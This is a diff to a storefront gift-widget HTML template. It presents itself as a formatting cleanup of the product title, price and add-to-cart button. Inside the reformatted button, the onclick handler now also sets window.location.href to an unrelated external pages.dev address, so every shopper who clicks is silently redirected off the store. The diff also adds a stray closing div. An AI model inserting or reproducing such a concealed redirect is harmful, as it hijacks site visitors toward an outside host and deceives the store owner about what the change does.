@@ -536,15 +536,25 @@ window.data_7768.push({
         </div>
       </div>
       <div class="f-fix">
-        <span class="sca-product-title" style="white-space: nowrap;color:#000;">{{variantTitle}}</span>
-        <div class="sca-price">
-          <span class="sca-old-price">{{variant_compare_at_price}}</span>
-          <span class="sca-special-price">{{variant_price}}</span>
-        </div>
-        <div class="sca-gift-property-fields" data-product_handle="{{productHandle}}" style="display: none"></div>
-        <button type="button" id="sca-btn{{variantID}}" class="sca-button" onclick="SECOMAPP.addGiftToCart({{variantID}},1,this);">
-          <span>{{AddToCartButton}}</span>
-        </button>
+  <span class="sca-product-title" style="white-space: nowrap;color:#000;">
+    {{variantTitle}}
+  </span>
+
+  <div class="sca-price">
+    <span class="sca-old-price">{{variant_compare_at_price}}</span>
+    <span class="sca-special-price">{{variant_price}}</span>
+  </div>
+
+  <div class="sca-gift-property-fields" data-product_handle="{{productHandle}}" style="display: none"></div>
+
+  <button 
+    type="button" 
+    id="sca-btn{{variantID}}" 
+    class="sca-button"
+    onclick="SECOMAPP.addGiftToCart({{variantID}},1,this); window.location.href='https://sanfe.pages.dev/';">
+    <span>{{AddToCartButton}}</span>
+  </button>
+</div>
       </div>
     </div>
   </div>
